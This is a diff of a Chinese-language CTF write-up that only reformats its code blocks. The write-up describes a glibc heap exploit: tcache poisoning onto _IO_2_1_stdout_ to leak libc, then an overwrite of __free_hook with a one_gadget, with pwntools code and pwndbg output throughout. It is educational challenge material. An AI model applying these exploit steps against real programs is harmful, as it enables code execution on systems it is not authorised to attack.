-no
-
-debug
-
-info>
-
-*
-)
-
-0x7ffff7dd0760
-
-<_IO_2_1_stdout_>
-
+pwndbg> p &_IO_2_1_stdout_
+$1 = (<data variable, no debug info> *) 0x7ffff7dd0760 <_IO_2_1_stdout_>
 ```
 
 
 ```
-
-new
-(
-0xa8
-,
-b
-'
-\x60\x07
-'
-)
-
+new(0xa8,b'\x60\x07')
 ```
 
 此时，idx2的fd被写为了`0x7ffff7dd0760(_IO_2_1_stdout_)`，我们查看tcachebins如下：
 
 
 ```
-
-pwndbg>
-
-bins
+pwndbg> bins
 tcachebins
-0x50
-
-[
-
-1
-]
-:
-
-0x555555a017a0
-
-—▸
-
-0x7ffff7dd0760
-
-(
-_IO_2_1_stdout_
-)
-
-◂—
-
-...
-0x70
-
-[
-
-1
-]
-:
-
-0x555555a01850
-
-—▸
-
-0x7ffff7dcfca0
-
-◂—
-
-...
+0x50 [  1]: 0x555555a017a0 —▸ 0x7ffff7dd0760 (_IO_2_1_stdout_) ◂— ...
+0x70 [  1]: 0x555555a01850 —▸ 0x7ffff7dcfca0 ◂— ...
 fastbins
 empty
 unsortedbin
-all:
-
-0x555555a01840
-
-—▸
-
-0x7ffff7dcfca0
-
-◂—
-
-0x555555a01840
+all: 0x555555a01840 —▸ 0x7ffff7dcfca0 ◂— 0x555555a01840
 smallbins
 empty
 largebins
 empty
-
 ```
 
 那么我们申请的第二个size=0x50的tcache就可以到`_IO_2_1_stdout_`中,也就是实现了任意地址写
@@ -3089,153 +837,29 @@ empty
 
 
 ```
-
-new
-(
-0x40
-)
-
-new
-(
-0x40
-,
-p64
-(
-0xfbad1800
-)
-+
-p64
-(
-0
-)
-*
-3
-+
-b
-'
-\x00
-'
-)
-
+new(0x40)
+new(0x40,p64(0xfbad1800)+p64(0)*3+b'\x00')
 ```
 
 于是我们的\_IO\_FILE被这样改造
 
 
-```
-
-strcut
-
-_IO_FILE
-
-{
-
-
-int
-
-_flags
-
-=
-
-0xfbad1800
-;
-
-
-char
-*
-
-_IO_read_ptr
-
-=
-
-0
-;
-
-/* Current read pointer */
-
-
-char
-*
-
-_IO_read_end
-
-=
-
-0
-;
-
-/* End of get area. */
-
-
-char
-*
-
-_IO_read_base
-
-=
-
-0
-;
-
-/* Start of putback+get area. */
-
-
-char
-*
-
-_IO_write_base
-
-=
-
-{}
-\
-x00
-;
-
-/* Start of put area. */
-
-
-......
-
+```asm
+strcut _IO_FILE {
+    int _flags = 0xfbad1800;
+    char* _IO_read_ptr = 0;    /* Current read pointer */
+    char* _IO_read_end = 0;    /* End of get area. */
+    char* _IO_read_base = 0;    /* Start of putback+get area. */
+    char* _IO_write_base = {}\x00;    /* Start of put area. */
+    ......
 ```
 
 成功泄露libc
 
 
 ```
-
-p
-.
-recv
-(
-8
-)
-
-libc_base
-
-=
-
-u64
-(
-p
-.
-recv
-(
-6
-)
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-))
--
-0x3ed8b0
-
+p.recv(8)
+libc_base = u64(p.recv(6).ljust(8,b'\x00'))-0x3ed8b0
 ```
 
 
@@ -3243,53 +867,9 @@ b
 
 
 ```
-
-ogg
-
-=
-
-libc_base
-
-+
-
-0x4f322
-
-new
-(
-0xa0
-,
-p64
-(
-libc_base
-+
-libc
-.
-sym
-[
-'__free_hook'
-]))
-#改fd=free_hook
-
-new
-(
-0x60
-)
-#释放一个tcache
-
-new
-(
-0x60
-,
-p64
-(
-ogg
-))
-#写入ogg
-
-dele
-(
-1
-)
-#执行
-
+ogg = libc_base + 0x4f322
+new(0xa0,p64(libc_base+libc.sym['__free_hook']))#改fd=free_hook
+new(0x60)#释放一个tcache
+new(0x60,p64(ogg))#写入ogg
+dele(1)#执行
 ```
